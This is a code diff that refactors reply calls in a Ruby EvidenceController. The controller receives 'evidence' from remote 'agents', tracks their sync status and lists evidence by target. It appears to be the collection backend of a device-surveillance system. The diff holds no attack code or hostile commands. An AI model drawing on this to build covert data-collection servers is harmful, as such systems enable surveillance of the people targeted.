@@ -36,11 +36,11 @@ class EvidenceController < RESTController
       RCS::DB::EvidenceDispatcher.instance.notify id, ident, instance
     rescue Exception => e
       trace :warn, "Cannot save evidence: #{e.message}"
-      return RESTController.reply.not_found
+      return not_found
     end
 
     trace :info, "Evidence saved. Dispatching evidence of [#{ident}::#{instance}][#{id}]"
-    return RESTController.reply.ok({:bytes => @request[:content]['content'].size})
+    return ok({:bytes => @request[:content]['content'].size})
   end
   
   # used to report that the activity of an instance is starting
@@ -52,7 +52,7 @@ class EvidenceController < RESTController
     
     # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
-    return RESTController.reply.not_found if agent.nil?
+    return not_found if agent.nil?
     
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(@params['sync_time']).getutc
@@ -65,7 +65,7 @@ class EvidenceController < RESTController
     agent.stat[:device] = @params['device']
     agent.save
     
-    return RESTController.reply.ok
+    return ok
   end
   
   # used to report that the processing of an instance has finished
@@ -77,12 +77,12 @@ class EvidenceController < RESTController
 
     # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
-    return RESTController.reply.not_found if agent.nil?
+    return not_found if agent.nil?
 
     agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
     agent.save
 
-    return RESTController.reply.ok
+    return ok
   end
 
   # used to report that the activity on an instance has timed out
@@ -94,12 +94,12 @@ class EvidenceController < RESTController
 
     # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
-    return RESTController.reply.not_found if agent.nil?
+    return not_found if agent.nil?
 
     agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_TIMEOUTED
     agent.save
 
-    return RESTController.reply.ok
+    return ok
   end
 
   def index
@@ -115,14 +115,14 @@ class EvidenceController < RESTController
     target_id = filter['target']
     filter.delete('target')
     target = Item.where({_id: target_id}).first
-    return RESTController.reply.not_found() if target.nil?
+    return not_found if target.nil?
 
     # filter by agent
     if filter['agent']
       agent_id = filter['agent']
       filter.delete('agent')
       agent = Item.where({_id: agent_id}).first
-      return RESTController.reply.not_found() if agent.nil?
+      return not_found if agent.nil?
       filter_hash[:item] = agent[:_id]
     end
 
@@ -153,7 +153,7 @@ class EvidenceController < RESTController
         query = filtering.where(filter_hash).order_by([[:acquired, :asc]])
       end
 
-      return RESTController.reply.ok(query)
+      return ok(query)
     end
   end
 
@@ -170,14 +170,14 @@ class EvidenceController < RESTController
     target_id = filter['target']
     filter.delete('target')
     target = Item.where({_id: target_id}).first
-    return RESTController.reply.not_found() if target.nil?
+    return not_found() if target.nil?
 
     # filter by agent
     if filter['agent']
       agent_id = filter['agent']
       filter.delete('agent')
       agent = Item.where({_id: agent_id}).first
-      return RESTController.reply.not_found() if agent.nil?
+      return not_found() if agent.nil?
       filter_hash[:item] = agent[:_id]
     end
 
@@ -198,7 +198,7 @@ class EvidenceController < RESTController
 
       # Flex RPC does not accept 0 (zero) as return value for a pagination (-1 is a safe alternative)
       num_evidence = -1 if num_evidence == 0
-      return RESTController.reply.ok(num_evidence)
+      return ok(num_evidence)
     end
   end
 
